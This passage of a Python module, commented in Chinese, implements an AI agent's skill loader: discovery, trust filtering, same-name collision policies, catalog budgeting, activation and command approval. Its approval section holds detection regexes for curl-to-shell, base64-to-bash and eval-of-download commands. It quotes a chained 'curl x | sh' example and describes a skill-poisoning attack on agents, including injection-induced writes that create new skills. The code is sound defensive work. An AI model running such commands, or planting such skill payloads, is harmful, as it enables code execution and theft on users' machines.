            diags.append(_at(_warn("UNRESOLVABLE", None, "目录无法读取，跳过。"), d))
            return
        skill_md = next((e for e in entries if e.name == "SKILL.md"), None)
        if skill_md is not None and depth > 0:
            full = _join(d, "SKILL.md")
            bad = escapes(full) if skill_md.is_symlink() else None
            if bad:
                diags.append(bad)
            else:
                load(d)
            return
        lower = next(
            (e for e in entries if e.name != "SKILL.md" and e.name.lower() == "skill.md"), None
        )
        if lower is not None and depth > 0:
            msg = f"文件名必须是 SKILL.md，这里是 {lower.name}。"
            diags.append(_at(_warn("LOWERCASE_SKILL_MD", None, msg), _join(d, lower.name)))
        for e in entries:
            if e.name in skip:
                continue
            child = _join(d, e.name)
            if e.is_symlink():
                bad = escapes(child)
                if bad:
                    diags.append(bad)
                    continue
                if not stat.S_ISDIR(os.stat(child).st_mode):
                    continue
            elif not e.is_dir(follow_symlinks=False):
                continue
            if depth + 1 > opts.max_depth:
                msg = f"超过扫描深度上限 {opts.max_depth}，没有继续往下找。"
                diags.append(_at(_warn("TOO_DEEP", None, msg), child))
                continue
            real = os.path.realpath(child, strict=True)
            if real in visited:
                continue
            visited.add(real)
            walk(child, depth + 1)

    walk(root.dir, 0)


def filter_trusted(skills: Sequence[SkillMeta]) -> list[SkillMeta]:
    """★ 信任过滤必须在合并**之前**。顺序反过来的话，一个陌生仓库里的同名 skill
    会先把你自己装的那份遮蔽掉，再被过滤掉——结果两份都没了。
    """
    return [s for s in skills if s.trust != "project-untrusted"]


# ─────────────────────────────────────────────────────────────
# 六、同名合并：策略是数据
# ─────────────────────────────────────────────────────────────

Policy = Literal["agentskills-guide", "claude-code", "gemini-cli", "codex"]


@dataclass
class Shadow:
    name: str
    winner: str
    loser: str
    policy: Policy


@dataclass
class Resolved:
    active: list[SkillMeta]
    shadowed: list[Shadow]
    ambiguous: list[str]
    """只有 codex 策略会有：同名的几份都留着，按名字引用时一个都不选。"""


POLICY_RANK: dict[str, dict[str, int]] = {
    "agentskills-guide": {"project": 0, "user": 1, "enterprise": 2, "builtin": 3},
    "claude-code": {"enterprise": 0, "user": 1, "project": 2, "builtin": 3},
    "gemini-cli": {"project": 0, "user": 1, "enterprise": 2, "builtin": 3},
}
"""跨层优先级，数字小的赢。
  agentskills-guide：指南说 project 覆盖 user 是「各家通用的约定」。
  claude-code：enterprise > personal > project，和指南正好相反。
  gemini-cli：workspace > user > extension > builtin（enterprise 在这里当 extension 看）。
"""


def alias_rank(alias: str | None) -> int:
    """gemini-cli 同层时 .agents 胜过 .gemini。"""
    if alias == ".agents":
        return 0
    if alias == ".gemini":
        return 1
    return 2


def by_name_then_location(a: SkillMeta, b: SkillMeta) -> int:
    return cmp_cp(a.name, b.name) or cmp_cp(a.location, b.location)


def resolve_collisions(skills: Sequence[SkillMeta], policy: Policy) -> Resolved:
    """按策略合并同名 skill。

    同层同名：agentskills-guide 和 claude-code 取路径排序后的第一个（first-found），
    gemini-cli 先比 alias，再取最后一个（last-wins，即 location 降序的第一个）。

    ★ 胜出的是**整条记录**。按字段合并（description 来自 A、location 来自 B）
      会让模型读到一份说明，加载的却是另一份文件。
    ★ 每一次遮蔽产生一条 Shadow，用户才知道自己装的那份为什么没生效。
    """
    groups: dict[str, list[SkillMeta]] = {}
    for s in skills:
        groups.setdefault(s.name, []).append(s)

    def by_policy(a: SkillMeta, b: SkillMeta) -> int:
        rank = POLICY_RANK[policy]
        r = rank[a.scope] - rank[b.scope]
        if r != 0:
            return r
        if policy == "gemini-cli":
            ar = alias_rank(a.alias) - alias_rank(b.alias)
            if ar != 0:
                return ar
            return cmp_cp(b.location, a.location)
        return cmp_cp(a.location, b.location)

    active: list[SkillMeta] = []
    shadowed: list[Shadow] = []
    ambiguous: list[str] = []
    for name in sorted(groups):
        g = sorted(groups[name], key=cmp_to_key(by_name_then_location))
        if len(g) == 1:
            active.append(g[0])
            continue
        if policy == "codex":
            active.extend(g)
            ambiguous.append(name)
            continue
        ranked = sorted(g, key=cmp_to_key(by_policy))
        winner = ranked[0]
        active.append(winner)
        for loser in ranked[1:]:
            shadowed.append(Shadow(name, winner.location, loser.location, policy))
    return Resolved(active, shadowed, ambiguous)


def select_by_name(active: Sequence[SkillMeta], name: str) -> SkillMeta | None:
    """用户或模型按名字点一个 skill。codex 策略下名字不唯一就返回 None。"""
    hits = [s for s in active if s.name == name]
    return hits[0] if len(hits) == 1 else None


# ─────────────────────────────────────────────────────────────
# 七、目录与预算
#
# 目录（catalog）是每一轮都要付的钱。预算不够时的三段：
#   1. 全量放得下 → 全量。
#   2. 否则，若所有 description 都只剩一个「…」时放得下 → 剩余预算按轮转
#      每次给每个 skill 加一个字符，直到谁都加不动。
#   3. 否则 → description 全部去掉，按排序贪心放 skill，第一个放不下的起全部省略。
# 原型是 Codex 的 render.rs。
# ─────────────────────────────────────────────────────────────

CatalogFormat = Literal["xml", "lines"]


@dataclass(frozen=True)
class CatalogOpts:
    budget_chars: int
    format: CatalogFormat


@dataclass
class CatalogEntry:
    name: str
    location: str
    shown: int
    """显示了多少个码点的 description。阶段 3 为 0。"""
    full: int


@dataclass
class CatalogResult:
    text: str
    stage: Literal[1, 2, 3]
    entries: list[CatalogEntry]
    omitted: list[str]
    warning: str | None


CATALOG_RANK: dict[str, int] = {"builtin": 0, "enterprise": 1, "project": 2, "user": 3}
"""目录顺序：builtin、enterprise、project、user，同层按 name、再按路径。
阶段 3 时 user 最先被省略。"""


def catalog_order(skills: Sequence[SkillMeta]) -> list[SkillMeta]:
    """进目录的 skill，按目录顺序。disable-model-invocation 的不进：
    指南要求直接藏起来，而不是列出来再在激活时拒绝。
    """
    visible = [s for s in skills if s.model_invocable]
    return sorted(visible, key=lambda s: (CATALOG_RANK[s.scope], s.name, s.location))


_DESC_SPACE = re.compile(r"[ \t\n\r]+")


def catalog_desc(s: SkillMeta) -> list[str]:
    r"""description 的码点数组：空白折成一个空格，首尾去空白。截短按这个数组算。

    ★ 空白集合写死成 [ \t\n\r]：Python 的 \s 和 JS 的 \s 认的字符不一样。
    """
    d = _DESC_SPACE.sub(" ", s.description)
    if d.startswith(" "):
        d = d[1:]
    if d.endswith(" "):
        d = d[:-1]
    return list(d)


def render_entry(s: SkillMeta, k: int | None, fmt: CatalogFormat) -> str:
    """渲染一条。k 是显示多少个码点的 description：k 小于全长时末尾加「…」；
    k 为 None 表示阶段 3，连 description 这一项都不要。

    ★ 截短一定要留标记。模型以为自己看到了完整说明，就会按半句话做判断。
    """
    units = catalog_desc(s)
    desc = None if k is None else "".join(units[:k]) + ("…" if k < len(units) else "")
    if fmt == "lines":
        if desc is None:
            return f"- {s.name} (file: {s.location})"
        return f"- {s.name}: {desc} (file: {s.location})"
    lines = ["  <skill>", f"    <name>{xml_escape(s.name)}</name>"]
    if desc is not None:
        lines.append(f"    <description>{xml_escape(desc)}</description>")
    lines += [f"    <location>{xml_escape(s.location)}</location>", "  </skill>"]
    return "\n".join(lines)


def wrap_catalog(entries: Sequence[str], fmt: CatalogFormat) -> str:
    """没有条目时返回空字符串：不输出空的 <available_skills> 块。"""
    if not entries:
        return ""
    if fmt == "lines":
        return "\n".join(entries)
    return "<available_skills>\n" + "\n".join(entries) + "\n</available_skills>"


def render_catalog(skills: Sequence[SkillMeta], opts: CatalogOpts) -> CatalogResult:
    budget, fmt = opts.budget_chars, opts.format
    order = catalog_order(skills)
    if not order:
        return CatalogResult("", 1, [], [], None)
    units = [catalog_desc(s) for s in order]
    caps = [min(len(u), MAX_DESC) for u in units]
    sep_len = cp_len("<available_skills>\n\n</available_skills>") if fmt == "xml" else 0

    def entry_len(i: int, k: int | None) -> int:
        return cp_len(render_entry(order[i], k, fmt))

    def total_of(lens: Sequence[int]) -> int:
        return 0 if not lens else sum(lens) + (len(lens) - 1) + sep_len

    def entries_of(ks: Sequence[int | None]) -> list[CatalogEntry]:
        return [
            CatalogEntry(s.name, s.location, ks[i] if ks[i] is not None else 0, len(units[i]))
            for i, s in enumerate(order)
        ]

    # 阶段 1
    full = [render_entry(s, caps[i], fmt) for i, s in enumerate(order)]
    if cp_len(wrap_catalog(full, fmt)) <= budget:
        return CatalogResult(wrap_catalog(full, fmt), 1, entries_of(caps), [], None)

    # 阶段 2
    ks = [0] * len(order)
    lens = [entry_len(i, 0) for i in range(len(order))]
    total = total_of(lens)
    if total <= budget:
        stuck = [c == 0 for c in caps]
        progress = True
        while progress:
            progress = False
            for i in range(len(order)):
                if stuck[i]:
                    continue
                nxt = entry_len(i, ks[i] + 1)
                delta = nxt - lens[i]
                if total + delta <= budget:
                    ks[i] += 1
                    lens[i] = nxt
                    total += delta
                    progress = True
                    if ks[i] == caps[i]:
                        stuck[i] = True
                else:
                    stuck[i] = True
        cut = sum(1 for i, k in enumerate(ks) if k < len(units[i]))
        text = wrap_catalog([render_entry(s, ks[i], fmt) for i, s in enumerate(order)], fmt)
        warning = f"skill 目录超出预算 {budget}：{cut} 个 description 被截短。"
        return CatalogResult(text, 2, entries_of(ks), [], warning)

    # 阶段 3
    kept: list[str] = []
    kept_lens: list[int] = []
    n = 0
    while n < len(order):
        e = render_entry(order[n], None, fmt)
        if total_of([*kept_lens, cp_len(e)]) > budget:
            break
        kept.append(e)
        kept_lens.append(cp_len(e))
        n += 1
    omitted = [s.name for s in order[n:]]
    warning = (
        f"skill 目录超出预算 {budget}：已移除全部 description，"
        f"另有 {len(omitted)} 个 skill 未列出。"
    )
    return CatalogResult(
        wrap_catalog(kept, fmt), 3, entries_of([None] * len(order))[:n], omitted, warning
    )


_MAX_SAFE_INTEGER = 2**53 - 1


def catalog_cost(skills: Sequence[SkillMeta], fmt: CatalogFormat = "xml") -> int:
    """目录全量渲染后的 token 估算。"""
    return estimate_tokens(render_catalog(skills, CatalogOpts(_MAX_SAFE_INTEGER, fmt)).text)


# ─────────────────────────────────────────────────────────────
# 八、激活
# ─────────────────────────────────────────────────────────────

ACTIVATE_TOOL: dict[str, Any] = {
    "name": "activate_skill",
    "description": (
        "加载一个 skill 的完整说明。可用的 skill 列在系统提示的 <available_skills> 里；"
        "当任务和某个 skill 的 description 相符时，先调用这个工具再动手。"
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "name": {"type": "string", "description": "skill 的 name，和目录里写的一致。"}
        },
        "required": ["name"],
        "additionalProperties": False,
    },
}
"""激活工具的定义是常量。

★ 指南建议把 name 参数约束成合法名字的 enum。这里不这么做：tools 是缓存前缀的
  第一层，enum 一变（装了、删了、改名了一个 skill）整条前缀失效。合法性在 handler 里查，
  查不到时把合法名字列表回给模型。
"""


@dataclass
class Session:
    activated: list[str]
    """已激活的 skill 的 location，按激活顺序。"""


@dataclass(frozen=True)
class SkillIO:
    read: Callable[[str], str]
    list: Callable[[SkillMeta], list[str]]


def _read_text(p: str) -> str:
    with open(p, encoding="utf-8", errors="replace", newline="") as fh:
        return fh.read()


FS_IO = SkillIO(read=_read_text, list=lambda s: list_resources(s))


@dataclass
class ActivateOk:
    text: str
    first: bool
    ok: Literal[True] = True


@dataclass
class ActivateErr:
    error: str
    ok: Literal[False] = False


ActivateResult = ActivateOk | ActivateErr


def activate(
    active: Sequence[SkillMeta],
    name: str,
    by: Literal["model", "user"],
    session: Session,
    io: SkillIO = FS_IO,
) -> ActivateResult:
    """激活一个 skill：读正文、去掉 frontmatter、包起来、列出资源。

    ★ 资源只列路径，不读内容。读不读、读哪个，是模型看了正文之后的事。
    ★ 同一会话第二次激活只回一句提示，不再注入一遍正文。
    ★ 模型看不见的 skill（disable-model-invocation）对模型来说就是不存在：
      错误信息里也不出现它的名字。
    """
    visible = [s for s in active if (s.model_invocable if by == "model" else s.user_invocable)]
    hits = [s for s in visible if s.name == name]
    if not hits:
        names = sorted({s.name for s in visible})
        listed = ", ".join(names) if names else "（无）"
        return ActivateErr(f"没有名为「{name}」的 skill。可用的有：{listed}")
    if len(hits) > 1:
        locs = ", ".join(s.location for s in hits)
        return ActivateErr(f"名为「{name}」的 skill 有 {len(hits)} 份，无法确定用哪一份：{locs}")
    s = hits[0]
    if s.location in session.activated:
        return ActivateOk(text=f"skill「{s.name}」已经加载过，说明就在上文。", first=False)
    sp = split_frontmatter(io.read(s.location))
    if not sp.ok:
        return ActivateErr(f"skill「{s.name}」的文件已经无法解析：{sp.diag.message}")
    resources = io.list(s)
    parts = [
        f'<skill_content name="{xml_escape(s.name)}">',
        sp.body.rstrip("\n"),
        "",
        f"Skill directory: {s.dir}",
        "本 skill 里的相对路径都相对于这个目录。",
    ]
    if resources:
        parts += [
            "",
            "<skill_resources>",
            *(f"  <file>{xml_escape(r)}</file>" for r in resources),
            "</skill_resources>",
        ]
    parts.append("</skill_content>")
    session.activated.append(s.location)
    return ActivateOk(text="\n".join(parts), first=True)


def _walk_files(root: str, max_depth: int) -> list[str]:
    out: list[str] = []

    def go(d: str, rel: str, depth: int) -> None:
        with os.scandir(d) as it:
            entries = sorted(it, key=lambda e: e.name)
        for e in entries:
            if e.name in DEFAULT_DISCOVER.skip:
                continue
            r = e.name if rel == "" else f"{rel}/{e.name}"
            # 不跟符号链接：指向目录的链接也当成文件列出来
            if e.is_dir(follow_symlinks=False):
                if depth < max_depth:
                    go(_join(d, e.name), r, depth + 1)
            else:
                out.append(r)

    go(root, "", 1)
    return out


def list_resources(skill: SkillMeta, max_depth: int = DEFAULT_DISCOVER.max_depth) -> list[str]:
    """列出 skill 目录里除 SKILL.md 之外的文件（相对路径，按码点排序）。不跟符号链接，不读内容。"""
    return [r for r in _walk_files(skill.dir, max_depth) if r != "SKILL.md"]


def resolve_skill_resource(skill: SkillMeta, rel: str) -> SafePath:
    """读 skill 里的一个资源文件时，把路径解析到 skill 目录之内。

    ★ 每个 skill 目录是一个单独的只读根。不要为了读到用户目录里的 skill
      去放宽 workspace 的根——那等于把整个 home 交出去。
    ★ 直接用 safe_path，不要自己拼字符串再 startswith：
      `references/creds -> ~/.ssh` 这种符号链接，字符串层面完全正常。
    """
    r = safe_path(skill.dir, rel, True)
    if isinstance(r, SafePathOk) and r.real_rel == ".":
        return SafePathErr(
            message="要读的是 skill 目录里的文件，不是目录本身。",
            log_note=f"skill 资源路径指向目录本身：{rel}",
            code="INVALID",
        )
    return r


@dataclass(frozen=True)
class Activation:
    name: str
    tokens: int


@dataclass(frozen=True)
class Pinned:
    name: str
    keep: int


def pinned_after_compaction(
    activations: Sequence[Activation], per_skill: int = 5000, total: int = 25000
) -> list[Pinned]:
    """压缩后重新挂回哪些 skill 正文。规则取自 Claude Code 文档：每个 skill 保留前
    per_skill 个 token，合计不超过 total，从最近激活的开始填，同名只算最近那次。

    文档没说预算剩一点时边界上那个 skill 是截一半还是整个丢掉；这里按「截一半」处理。
    """
    seen: set[str] = set()
    out: list[Pinned] = []
    left = total
    for a in reversed(activations):
        if a.name in seen:
            continue
        seen.add(a.name)
        keep = max(0, min(a.tokens, per_skill, left))
        left -= keep
        out.append(Pinned(a.name, keep))
    return out


# ─────────────────────────────────────────────────────────────
# 九、执行审批：allowed-tools 是预批准，不是限制
# ─────────────────────────────────────────────────────────────


def skill_dir_hash(skill: SkillMeta) -> str:
    r"""skill 目录的内容哈希：所有文件（含 SKILL.md）按相对路径排序，逐个喂进 sha256。
    符号链接只记它指向哪，不跟进去。按字节算，不按 UTF-8 文本：二进制资源解码会丢信息。

    ★ 喂的字节和顺序与 TS 完全相同：rel、\0、'L'+链接目标 或 'F'+文件字节、\0。
      同一个目录两边算出同一个哈希。
    """
    h = hashlib.sha256()
    for rel in _walk_files(skill.dir, DEFAULT_DISCOVER.max_depth):
        full = _join(skill.dir, *rel.split("/"))
        h.update(rel.encode("utf-8", "surrogateescape"))
        h.update(b"\x00")
        if stat.S_ISLNK(os.lstat(full).st_mode):
            h.update(("L" + os.readlink(full)).encode("utf-8", "surrogateescape"))
        else:
            h.update(b"F")
            with open(full, "rb") as fh:
                h.update(fh.read())
        h.update(b"\x00")
    return h.hexdigest()


Approval = Literal["auto", "ask", "deny"]


@dataclass(frozen=True)
class DangerousPattern:
    id: str
    re: re.Pattern[str]


DANGEROUS_PATTERNS: list[DangerousPattern] = [
    DangerousPattern("pipe-to-shell", _js(r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|da)?sh\b")),
    DangerousPattern(
        "base64-exec", _js(r"\bbase64\s+(-d|-D|--decode)\b[^|]*\|\s*(sudo\s+)?(ba|z|da)?sh\b")
    ),
    DangerousPattern("remote-package", _js(r"\b(npx|uvx|bunx|pnpx)\b|\bpipx\s+run\b")),
    DangerousPattern("eval-download", _js(r"\beval\b.*\$\(\s*(curl|wget)\b")),
]
"""即使命令被 allowed-tools 预批准，出现这些形状也必须问人。
2026 年规模最大的一次 skill 投毒，载荷就写在 SKILL.md 正文的「前置条件」里：
让你先复制一段 base64 解码后交给 bash 的命令。
"""

SHELL_META = re.compile(r"[;&|`$<>(){}\n\r]")
"""出现任何一个，命令就不是「一条简单命令」，不能拿去和预批准列表做精确匹配。"""

_BASH_RULE = _js(r"Bash\((.*)\)")
_SPACES = re.compile(r"[ \t]+")


def match_allowed(command: str, allowed_tools: Sequence[str]) -> bool:
    """allowed-tools 里的 Bash 规则：
      Bash              → 任何 bash 命令（这就是「预批准」的真实含义：放得很开）
      Bash(git status)  → 精确等于
      Bash(git diff:*)  → 以 `git diff` 开头（后面是空格或结尾）
    命令里有 shell 元字符就一律不算命中：`git status && curl x | sh` 以 `git status` 开头。
    """
    cmd = _SPACES.sub(" ", trim_sp(command))
    if cmd == "" or SHELL_META.search(cmd):
        return False
    for t in allowed_tools:
        if t == "Bash":
            return True
        m = _BASH_RULE.fullmatch(t)
        if not m:
            continue
        pat = _SPACES.sub(" ", trim_sp(m[1]))
        if pat.endswith(":*"):
            prefix = trim_sp(pat[:-2])
            if cmd == prefix or cmd.startswith(prefix + " "):
                return True
        elif cmd == pat:
            return True
    return False


@dataclass(frozen=True)
class ApprovalInput:
    skill: SkillMeta
    command: str
    approved_hash: str | None
    """用户批准（或安装）这个 skill 时记下的目录哈希。没批准过就是 None。"""
    current_hash: str


@dataclass
class ApprovalResult:
    decision: Approval
    reasons: list[str]


def script_approval(a: ApprovalInput) -> ApprovalResult:
    """一个 skill 想跑一条命令时，自动放行、问人，还是拒绝。

      project-untrusted               → deny（它根本不该出现在目录里，走到这一步说明流水线有洞）
      命中危险模式                     → 至少 ask，即使被预批准
      没被 allowed-tools 精确命中       → ask
      没批准过，或目录哈希和批准时不同   → ask（skill 版的 rug pull：批准之后被人改了）
      以上都不是                       → auto

    reasons 按上面的顺序列出所有成立的理由，给人看为什么要问。
    """
    if a.skill.trust == "project-untrusted":
        return ApprovalResult("deny", ["UNTRUSTED"])
    reasons = [f"DANGEROUS:{p.id}" for p in DANGEROUS_PATTERNS if p.re.search(a.command)]
    if not match_allowed(a.command, a.skill.allowed_tools):
        reasons.append("NOT_PREAPPROVED")
    if a.approved_hash is None:
        reasons.append("NOT_APPROVED")
    elif a.approved_hash != a.current_hash:
        reasons.append("HASH_CHANGED")
    return ApprovalResult("auto" if not reasons else "ask", reasons)


_SKILL_PATH = re.compile(r"(^|/)\.(agents|claude|gemini|codex|cursor)/skills(/|\Z)")


def is_skill_path(p: str) -> bool:
    r"""写进这些目录的文件会变成可触发的 skill。Claude Code 在**当前会话**里就会热加载，
    所以一次被注入诱导的写入，下一轮就是一个新 skill。这类写入要按高危处理。

    ★ 行尾用 \Z 而不是 $：Python 的 $ 会在末尾换行之前匹配。
    """
    s = p.replace(os.sep, "/").replace("\\", "/")
    return _SKILL_PATH.search(s) is not None


# ─────────────────────────────────────────────────────────────
# 十、账本：观察实验用的整数算术
# ─────────────────────────────────────────────────────────────

_NON_WORD = re.compile(r"[^a-z0-9]+")


def word_jaccard_bp(a: str, b: str) -> int:
    """小写词集合的 Jaccard，单位是基点（万分之一）。只是一个确定性的重叠代理指标，不预测触发。"""

    def words(s: str) -> set[str]:
        return {w for w in _NON_WORD.split(s.lower()) if w != ""}

    wa = words(a)
    wb = words(b)
    inter = sum(1 for w in wa if w in wb)
    union = len(wa) + len(wb) - inter
    return 0 if union == 0 else (10000 * inter) // union


CACHE_WRITE = 125
"""缓存倍率，单位是百分之一：写 1.25 倍、读 0.1 倍（L15）。"""
CACHE_READ = 10


def resident_cost(tokens: int, rounds: int, start: int = 1) -> int:
    """R 轮会话里一段内容的输入计费，单位是「基础 token 价 × 1/100」。
    从第 start 轮（TS 里叫 from）进入上下文：那一轮按缓存写，之后每轮按缓存读。
    """
    if start > rounds:
        return 0
    return tokens * CACHE_WRITE + tokens * CACHE_READ * (rounds - start)


@dataclass(frozen=True)
class PrefixLayers:
    tools: int
    system: int
    history: int


@dataclass(frozen=True)
class PrefixChange:
    invalidated: int
    cost: int


def prefix_change_cost(
    layers: PrefixLayers, changed: Literal["tools", "system", "tail"]
) -> PrefixChange:
    """会话中途改了前缀的某一层，这一轮的输入计费（同上单位）。
    前缀的顺序是 tools → system → messages：改了哪一层，它和它后面的全部按缓存写重算。
    """
    tools, system, history = layers.tools, layers.system, layers.history
    if changed == "tools":
        invalidated = tools + system + history
    elif changed == "system":
        invalidated = system + history
    else:
        invalidated = 0
    kept = tools + system + history - invalidated
    return PrefixChange(invalidated, invalidated * CACHE_WRITE + kept * CACHE_READ)


def fmt_hundredths(h: int) -> str:
    """整数的百分之一单位格式化成两位小数，不经过浮点。"""
    sign = "-" if h < 0 else ""
    a = abs(h)
    return f"{sign}{a // 100}.{a % 100:02d}"
